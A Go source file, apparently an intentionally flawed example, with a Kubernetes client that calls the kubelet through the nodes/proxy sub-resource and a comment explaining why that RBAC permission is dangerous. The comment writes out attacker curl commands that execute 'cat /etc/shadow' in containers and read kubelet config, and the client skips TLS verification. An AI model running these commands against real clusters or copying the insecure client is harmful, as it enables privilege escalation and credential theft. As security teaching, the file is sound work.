package main

// kubelet.go — Kubernetes API client that uses the nodes/proxy sub-resource.
//
// The RBAC permission this requires:
//
//   apiGroups: [""]
//   resources: ["nodes/proxy"]
//   verbs:     ["get"]
//
// This looks like a safe, read-only permission.  The mistake is that
// nodes/proxy is a *transparent tunnel* to the kubelet's own HTTP server
// (default port 10250).  The kubelet API is effectively unauthenticated
// when reached this way — it trusts the Kubernetes API server to have
// already authorised the caller.
//
// What an attacker can do once they have a pod with this SA token:
//
//   # List all pods on the node
//   curl -sk -H "Authorization: Bearer $TOKEN" \
//     https://kubernetes.default.svc/api/v1/nodes/$NODE/proxy/pods
//
//   # Execute a command in any container on the node
//   curl -sk -H "Authorization: Bearer $TOKEN" -X POST \
//     "https://kubernetes.default.svc/api/v1/nodes/$NODE/proxy/run/$NS/$POD/$CTR" \
//     -d 'cmd=cat /etc/shadow'
//
//   # Read kubelet's own config (may contain credentials)
//   curl -sk -H "Authorization: Bearer $TOKEN" \
//     https://kubernetes.default.svc/api/v1/nodes/$NODE/proxy/configz

import (
	"fmt"
	"io"
	"net/http"
	"os"
)

const (
	saTokenPath = "/var/run/secrets/kubernetes.io/serviceaccount/token"
	k8sAPIBase  = "https://kubernetes.default.svc"
)

// kubeletProxy calls path on the kubelet for nodeName via the Kubernetes
// API server nodes/proxy sub-resource.
func kubeletProxy(nodeName, path string) ([]byte, error) {
	token, err := os.ReadFile(saTokenPath)
	if err != nil {
		return nil, fmt.Errorf("read SA token: %w", err)
	}

	url := fmt.Sprintf("%s/api/v1/nodes/%s/proxy/%s", k8sAPIBase, nodeName, path)

	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Authorization", "Bearer "+string(token))

	// Use a client that skips TLS verification — typical in in-cluster code
	// that doesn't properly pin the CA bundle.
	client := insecureHTTPClient()
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("kubelet proxy request: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read response: %w", err)
	}
	if resp.StatusCode >= 400 {
		return nil, fmt.Errorf("kubelet returned %d: %s", resp.StatusCode, body)
	}
	return body, nil
}
